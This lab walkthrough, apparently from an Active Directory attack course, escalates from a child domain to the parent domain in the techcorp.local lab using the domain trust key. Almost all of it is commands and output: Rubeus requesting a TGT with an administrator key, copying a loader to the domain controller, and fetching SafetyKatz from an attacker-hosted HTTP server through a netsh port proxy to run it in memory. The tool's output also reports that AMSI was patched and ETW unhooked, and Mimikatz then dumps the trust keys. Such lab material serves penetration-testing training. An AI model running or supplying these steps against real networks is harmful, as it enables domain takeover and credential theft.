# Hands-On 20:

```
Using DA access to us.techcorp.local, escalate privileges to Enterprise Admin or DA to the parent
domain, techcorp.local using the domain trust key.
```
## Index Of Content:

  1. [Escalate Privileges to Enterprise Admin](#escalate-privileges-to-enterprise-admin)


## Escalate Privileges to Enterprise Admin

From elevated privileges on the local attacker machine using rubeus spawn new process cmd:

```
C:\Windows\system32>C:\AD\Tools\Rubeus.exe asktgt /user:administrator /aes256:db7bd8e34fada016eb0e292816040a1bf4eeb25cd3843e041d0278d30dc1b335 /opsec /createonly:C:\Windows\System32\cmd.exe /show /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.1

[*] Action: Ask TGT

[*] Using domain controller: US-DC.us.techcorp.local (192.168.1.2)
[!] Pre-Authentication required!
[!]     AES256 Salt: US-DCAdministrator
[*] Using aes256_cts_hmac_sha1 hash: db7bd8e34fada016eb0e292816040a1bf4eeb25cd3843e041d0278d30dc1b335
[*] Building AS-REQ (w/ preauth) for: 'us.techcorp.local\administrator'
[*] Using domain controller: 192.168.1.2:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      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
[+] Ticket successfully imported!

  ServiceName              :  krbtgt/US.TECHCORP.LOCAL
  ServiceRealm             :  US.TECHCORP.LOCAL
  UserName                 :  Administrator
  UserRealm                :  US.TECHCORP.LOCAL
  StartTime                :  2/28/2023 11:21:22 AM
  EndTime                  :  2/28/2023 9:21:22 PM
  RenewTill                :  3/7/2023 11:21:22 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  PeaMDnTxS96AbkqMQIR4z5CnxaUdjOGqspIWPL8O32w=
  ASREP (key)              :  DB7BD8E34FADA016EB0E292816040A1BF4EEB25CD3843E041D0278D30DC1B335
```

Validate the previous ticket:

```
C:\Windows\system32>klist

Current LogonId is 0:0x738a20d

Cached Tickets: (1)

#0>     Client: Administrator @ US.TECHCORP.LOCAL
        Server: krbtgt/US.TECHCORP.LOCAL @ US.TECHCORP.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 2/28/2023 11:21:22 (local)
        End Time:   2/28/2023 21:21:22 (local)
        Renew Time: 3/7/2023 11:21:22 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
```

The next step is copy the binary Loader.exe con the target US_DC server and access :

```
C:\Windows\system32>echo F | xcopy C:\AD\Tools\Loader.exe \\us-dc\C$\Users\Public\Loader.exe /Y
Does \\us-dc\C$\Users\Public\Loader.exe specify a file name
or directory name on the target
(F = file, D = directory)? F
C:\AD\Tools\Loader.exe
1 File(s) copied

C:\Windows\system32>winrs -r:us-dc cmd
Microsoft Windows [Version 10.0.17763.3650]
(c) 2018 Microsoft Corporation. All rights reserved.

```
On the attacker side startup a python HTTP server on the port 8989:

```
C:\AD\Tools>python -m SimpleHTTPServer 8989
Serving HTTP on 0.0.0.0 port 8989 ...
192.168.1.2 - - [28/Feb/2023 11:25:48] "GET /SafetyKatz.exe HTTP/1.1" 200 -

```

On the attacker side Load the binary SafetyKatz.exe directly on memory, previously is required create a network proxy rule using netsh:

```
C:\Users\Administrator>netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=8989 connectaddress=192.168.100.17
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=8989 connectaddress=192.168.100.17


C:\Users\Administrator>C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe
[+] Successfully unhooked ETW!
[+] Successfully patched AMSI!
[+] URL/PATH : http://127.0.0.1:8080/SafetyKatz.exe Arguments :

```

And dump full credentials:

```
[+] URL/PATH : http://127.0.0.1:8080/SafetyKatz.exe Arguments :

  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # -path
ERROR mimikatz_doLocal ; "-path" command of "standard" module not found !

Module :        standard
Full name :     Standard module
Description :   Basic commands (does not require module name)

            exit  -  Quit mimikatz
             cls  -  Clear screen (doesn't work with redirections, like PsExec)
          answer  -  Answer to the Ultimate Question of Life, the Universe, and Everything
          coffee  -  Please, make me a coffee!
           sleep  -  Sleep an amount of milliseconds
             log  -  Log mimikatz input/output to file
          base64  -  Switch file input/output base64
         version  -  Display some version informations
              cd  -  Change or display current directory
       localtime  -  Displays system local date and time (OJ command)
        hostname  -  Displays system local hostname

mimikatz(commandline) # http://127.0.0.1:8080/SafetyKatz.exe
ERROR mimikatz_doLocal ; "http://127.0.0.1:8080/SafetyKatz.exe" command of "standard" module not found !

Module :        standard
Full name :     Standard module
Description :   Basic commands (does not require module name)

            exit  -  Quit mimikatz
             cls  -  Clear screen (doesn't work with redirections, like PsExec)
          answer  -  Answer to the Ultimate Question of Life, the Universe, and Everything
          coffee  -  Please, make me a coffee!
           sleep  -  Sleep an amount of milliseconds
             log  -  Log mimikatz input/output to file
          base64  -  Switch file input/output base64
         version  -  Display some version informations
              cd  -  Change or display current directory
       localtime  -  Displays system local date and time (OJ command)
        hostname  -  Displays system local hostname

mimikatz # lsadump::trust /patch

Current domain: US.TECHCORP.LOCAL (US / S-1-5-21-210670787-2521448726-163245708)

Domain: TECHCORP.LOCAL (TECHCORP / S-1-5-21-2781415573-3701854478-2406986946)
 [  In ] US.TECHCORP.LOCAL -> TECHCORP.LOCAL
    * 2/27/2023 8:43:18 PM - CLEAR   - da 8c 38 16 fd fc 96 58 7b 17 2d be 9c be 88 a5 ec 79 72 9d 6c 29 d8 01 b0 c9 cc b7 d1 d1 d4 d9 01 f2 24 52 48 e2 13 8d 3d 62 2d 29 07 2c 27 4d 59 5b 67 dd 6d 63 8f bd ea 2b 23 a9 19 b5 87 87 ad 0c b0 b0 f9 fc 91 50 18 b4 cd 1f 6d 19 80 de 47 91 c1 98 c3 e3 e0 9c 61 11 04 0d f8 6c 20 44 73 bd d0 83 46 df 65 a6 0f 41 26 5c 0c bd f7 8a 6a 46 0f 5f 86 18 b3 48 f0 04 2f 13 68 8b 81 7b 0e 56 57 52 12 f0 1d 5d 7f 17 44 43 12 9a 53 f5 5f 2c 26 04 62 82 46 8c 10 86 e2 70 3c cb ea d1 24 01 26 4f 2f a1 1a 06 6d 19 92 23 cf e4 ce f4 1b b0 32 34 31 85 e7 08 0a 71 44 b3 01 05 c9 7b cb e3 69 79 c7 a1 9b 10 83 f9 19 61 39 b2 2d e1 1c 2e f9 60 7f 6b 4f 07 5f 30 8c 90 09 d6 33 5c ec 7f d8 ac 26 5b f1 a4 99 58 b5 30 dd b0 63 a5
        * aes256_hmac       d8923d0211190e640849fc81868a6f68e6da2b01e9ce7c269b6410b26c679418
        * aes128_hmac       648c5701a7721dc6409b2265140986c4
        * rc4_hmac_nt       4de80aa031eab75dba76146cdad5cf58

 [ Out ] TECHCORP.LOCAL -> US.TECHCORP.LOCAL
    * 2/27/2023 8:06:12 PM - CLEAR   - a7 68 bb 6f 10 95 3a 37 5d c8 53 44 23 dd 61 ad 7a 3b 49 4c 00 56 64 5c 20 aa c6 07 c5 61 62 9d 44 fa 22 3d 7e c0 42 34 c9 4f 98 e0 bb b2 c3 17 24 77 af 45 7b c6 87 9b 0b 76 a9 90 46 3c 61 19 c7 90 b1 24 65 54 1c 56 d3 f7 72 e7 6d 8b a9 2e 8c 1b 87 9b b7 57 2b ff fd 3e 9f 08 23 74 20 0b bd 99 ea 46 0d 94 64 c9 6d a1 3a 00 fc 2a aa 22 9d c3 91 21 35 2b 60 fc 09 b1 4f 4f 68 11 be 5c 46 07 0b 7a a3 ad fe 2b 04 93 db 9f 4e 97 3b 5c 1b 5e 42 9c 42 da 5a 20 23 9e e1 b6 39 31 33 1a 3a 7d 78 d4 de ce a3 bc 81 84 ff 3f 73 b7 48 29 08 32 dd 6d 68 3b 82 62 ae cd 05 23 67 f2 4b 03 a2 1e f3 d1 5d 51 90 86 25 61 83 7a 1e 4f d5 65 a3 29 eb 14 e4 85 63 37 ef 21 5a 11 03 b7 b6 0a e1 c2 34 af 26 3e 77 cd ca 22 09 ea 66 80 be 40
        * aes256_hmac       1e001e3370338199b8463bce0b0d8d25db30a889d27800f1053b306d20414be3
        * aes128_hmac       9c025c7ad0b67b7051556aa88f453184
        * rc4_hmac_nt       669317ad5222cfabb0e767318623f2c2

 [ In-1] US.TECHCORP.LOCAL -> TECHCORP.LOCAL
    * 12/11/2022 8:35:34 AM - CLEAR   - 67 0e 4a 27 70 f1 87 25 aa 93 80 2b f8 59 11 fa 90 24 84 e6 db f8 4d b3 00 3e ba 88 51 b3 19 e7 a2 72 15 5f 14 64 f5 d7 f7 98 a2 56 1c ce 62 09 11 fb f2 93 ce b9 16 b9 47 f9 1b 2b 42 3d 86 ed e7 ef d7 d9 98 76 fa ad 62 13 54 c8 05 28 26 6f e6 2c f5 f9 6d 12 60 20 3a 1f 00 33 4b 35 e4 5d 4c 49 18 0e 51 f7 e6 13 32 f3 8d b6 cc 33 5b 0d 32 ee 19 e6 b8 31 6c cd e0 9e e3 d9 07 e0 87 1c d8 e0 ac fb ee 45 ed d2 65 33 20 f1 f3 ea d6 f6 c6 d4 a8 a4 9b 2c a3 7c 56 12 c1 ad 33 ed fa f4 46 98 97 c5 1e 22 84 47 f5 3f 72 ab 0c 03 71 aa 83 87 01 45 00 28 e1 20 7f f4 6f e4 4b 18 bc 90 f2 08 33 c9 e9 84 bd e4 7f 1d d8 67 d6 e1 27 6d 8f 6e c0 ac bf 34 a2 72 16 1c 0f c4 9c 66 35 e2 94 80 2f 65 f2 34 21 34 ea 1d ac c9 51 6f 0a 5d
        * aes256_hmac       103bd68f79d6b229674005186d58ccc4313732fff1a7d71cdd8bc0b75fb17860
        * aes128_hmac       fce23bfcbb8465bab0af0385ca079a82
        * rc4_hmac_nt       c571b906ca96798300442abb5e509fda

 [Out-1] TECHCORP.LOCAL -> US.TECHCORP.LOCAL
    * 2/27/2023 8:06:12 PM - CLEAR   - c6 22 17 9e a0 f4 09 30 de 28 09 d4 c4 79 90 92 ab aa e3 76 e5 3c 05 5f e9 36 c9 ba 67 bc 8a 5b e3 ff 4f 2d 73 e7 e9 57 1c f4 b6 47 72 a1 68 9e ed 1c 79 66 56 eb b5 62 fe 31 92 1a 8b 2c aa 15 14 29 a9 c4 66 5e fe 5a 80 36 84 91 9e 59 3e 8a d6 90 d0 5e 3a 77 8b 96 26 a1 40 ed 92 c4 23 53 30 31 b9 bd a4 ce 6f 6e 2a 8f b3 db 94 2f 88 81 ca 2c 48 4b 93 bc ad 51 af 10 3d 71 c9 4b b3 ac 5e eb 3b 6b e8 f3 85 fd e0 0e de 3f 7f 27 f1 a0 7b 10 1a 6d 9d 7f f8 14 8b 23 0e 96 2f 39 d7 62 0b c7 b0 1d 56 a1 b9 b1 af cc 71 0f 48 d4 39 29 1a 23 fa f8 78 a8 18 fb 24 0c 77 29 90 22 10 bc 44 3e 2e 73 49 6a 49 2f 82 be 95 5c 0a 21 58 7b b4 80 66 b0 37 f3 be 19 b2 86 1d fc 0c 19 69 6f 6f 46 c1 a7 09 71 bc a2 61 24 75 ef a6 29 04 8f
        * aes256_hmac       792204b3e3df836bcb8dc958c1ddc39eeef22835276957de6a84e31cc37ba3cc
        * aes128_hmac       3e517b47c5966385c672735ea17513f5
        * rc4_hmac_nt       f01daadf07fa71bdb343e882063bc0de


Domain: EU.LOCAL (EU / S-1-5-21-3657428294-2017276338-1274645009)
 [  In ] US.TECHCORP.LOCAL -> EU.LOCAL
    * 2/27/2023 8:43:57 PM - CLEAR   - 7b 9b 1e 31 63 4a 76 d9 9e 69 90 bf d3 d8 ba c8 73 0e 53 4e bd ff ef 21 0b ec c9 a8 0b 83 b0 05 ae 05 f1 89 f5 9d c1 27 16 b3 49 c4 4c a6 7c 6b ad e6 78 fe 2f bf 61 20 f3 06 2f 1b a3 39 87 35 c8 33 0c df bb 1b 89 5d 7f f4 3d a1 8f 9f ef 7e 57 89 72 c3 94 59 0c c3 71 03 e9 8c 26 be bd fc 27 90 23 18 29 c1 30 7d bb a1 ef 7b e4 4b bd b3 1d ba 8d 90 cf 32 d9 d9 a0 96 3e d8 ca e2 60 d0 a4 28 c1 26 bf 95 e1 61 70 26 81 21 98 f8 37 56 13 f4 8b cb e6 12 68 a4 d7 4c 80 39 35 86 f0 b9 f4 fe 03 e7 72 7a d8 3b 87 8b 6e a1 61 8b 34 a0 8b 9f b2 c3 d6 cf 9c 4a 98 7d 5d 8c 07 b0 5e 38 fa 31 81 b5 a5 6a bb dc ce b3 9e a0 c4 25 c0 fe e4 e5 f5 f3 46 18 43 04 56 2a 95 6f 72 c5 65 ee ee f9 bb 8b 1b 95 46 9c 60 b7 6b e2 2b 8c a9 ed
        * aes256_hmac       1fbf8fbfec39718c8ce7843b3c7b0f3ece46296352330847b3d507e44b1b0b6e
        * aes128_hmac       4f9647a567f92133128c3c9a16b1ae70
        * rc4_hmac_nt       dd79021a1632a4bd069f8e5a8782c808

 [ Out ] EU.LOCAL -> US.TECHCORP.LOCAL
    * 2/27/2023 8:06:13 PM - CLEAR   - 35 67 fc 4c 14 78 0c 2c 9d 08 c5 b3 93 15 30 98 e0 2f 62 e8 d7 3b 48 09 54 ac 00 cc 1e 59 05 6d b7 02 f1 22 cb f5 af 1f 57 2c b1 41 16 d2 cf a1 d5 bc ff 82 a6 29 b2 f2 20 c0 d6 7c c8 45 a0 c9 78 96 7b 07 18 37 e7 52 61 b5 31 f0 8b b9 ac 35 4b 95 05 1a 51 09 43 92 6d f7 f1 18 0d 05 b9 56 c7 3c ac 25 8d b7 79 ae e6 17 81 d0 ba ff 8f b3 64 04 26 94 94 c8 58 8e 5f 29 0c 40 48 00 f4 34 76 9d 71 a9 e5 76 c0 d6 0a 17 03 0a c6 4b a3 8e ee 3d 88 50 dd fc c9 e0 78 8f e7 e8 8e 15 35 33 50 c3 c0 e7 fc 8d 5d 8c 22 4a c8 35 89 8b ef 88 6d 6d ae 09 83 3e 32 1e a7 72 38 84 41 67 86 01 02 5a e4 c7 d1 e5 d4 51 43 0a 45 b0 1b eb de 57 30 15 a4 c8 ee cb 03 58 6d ac c7 c1 c2 df 67 e5 97 27 b7 07 a7 18 32 d0 99 ac 2a a5 b5 fe b0 33
        * aes256_hmac       0fff11cd2be743a0807981285aef5928289824e367036de09a38b60bd7069d79
        * aes128_hmac       6e403f5123e66ac7441dc222e6ca98da
        * rc4_hmac_nt       f0efbdcdf97f7bb246d556b78fb65571

 [ In-1] US.TECHCORP.LOCAL -> EU.LOCAL
    * 12/11/2022 8:35:35 AM - CLEAR   - 50 7a 16 35 98 ae e6 65 0d 41 99 b5 c7 c5 f0 0d 63 ea b1 d8 84 67 df 40 41 ca cd 92 e7 b0 5c 7b 08 b7 c7 62 94 0f f0 d8 e7 2e 46 e2 8d 9b a1 f4 3b a6 ab a5 7b c5 9c 12 d4 e7 f5 5a 5d 85 ea ea fc 4f 8f 39 42 ae 04 2d 1e 24 10 c7 81 84 b6 0d 4f 4b a9 ef 8e cd 61 e5 0a dd e0 0c 70 48 5f 27 74 41 fb 35 bb 16 e7 fd 0a a6 23 5a 1b de 53 7d 06 ab b0 0d 80 12 6e 83 2f b5 38 85 2f b2 68 91 9a c3 e1 d9 73 9e bd d4 0c 79 8b 05 a1 d4 3a ee 4f 81 bd 90 2e 8e dd 9b 78 e1 00 45 b1 6a fd 7f f6 0e de 01 8e fd 30 80 f1 7c 8e 5f 5e 4f 00 98 66 90 ce 09 d9 8e a4 c8 17 ab 6c c0 12 a6 22 bb f1 a3 61 bb 32 73 27 ba ba 0a 20 85 45 9d 55 68 88 fd 07 75 82 db 37 cc b5 1f 6e c4 7f e0 0b 4f 78 95 ce 71 3f 98 5d c0 c3 b0 7a 33 8e f9 24 85
        * aes256_hmac       99041b743c444af5205cc2f8e2842c290af5f9fde732bd37833a354f7224ebac
        * aes128_hmac       1862ad074db1882131c3c3e338594972
        * rc4_hmac_nt       94622325b64320a2376df0cecd73fcad

 [Out-1] EU.LOCAL -> US.TECHCORP.LOCAL
    * 2/27/2023 8:06:13 PM - CLEAR   - 42 87 57 28 a5 34 b0 c2 b8 31 9c 05 57 61 de 88 73 71 e3 b0 b8 ac 87 f8 1e 5f 2c c7 66 fb 6c 89 0b a7 eb 30 04 a2 11 f2 7f 24 1e 1c ab 25 43 bf 31 98 cb b1 96 9e 86 80 d2 83 cc 62 b4 f8 33 66 7d 62 04 b3 ab 6a a2 c8 c9 6a 0b 40 87 ff 37 67 0a 78 ae ea 93 02 33 3f 50 fc 19 d2 16 ab 4d 5d 27 af cf 01 f8 8f eb af 5a a1 15 3c ba 5a 9f 98 c2 22 22 8c b7 6d 6b b2 04 aa a1 8c 72 f6 fc b4 78 83 b3 f0 2e f2 ba c2 8d 44 f6 2c 8b 4c 6b 1a c0 19 9d fc e7 b4 a9 ac b0 79 fe e4 78 d8 19 b2 0f 28 9c 19 3e 32 d1 76 f9 a7 9a 10 eb da 33 ce e3 91 db fd dc 03 6a a5 22 64 d1 8b 19 60 81 8e 15 0b fc 27 90 26 63 e8 ae 12 61 06 7b 33 60 f4 7a 32 23 f6 f3 bd 03 d0 90 b0 d2 c8 3b 60 9c c0 fd 6d fc b5 e6 b2 c7 2c 4e af 35 83 62 4c ce 2f
        * aes256_hmac       b687515d5f74d8aa87a2755fea6eb13713df31668d8d522d916a9dc91565d37c
        * aes128_hmac       d8a7f052a1450f9f8343f784027f11fd
        * rc4_hmac_nt       6deccf44bd8c61b7494a4bcce4622fc5


mimikatz #
```
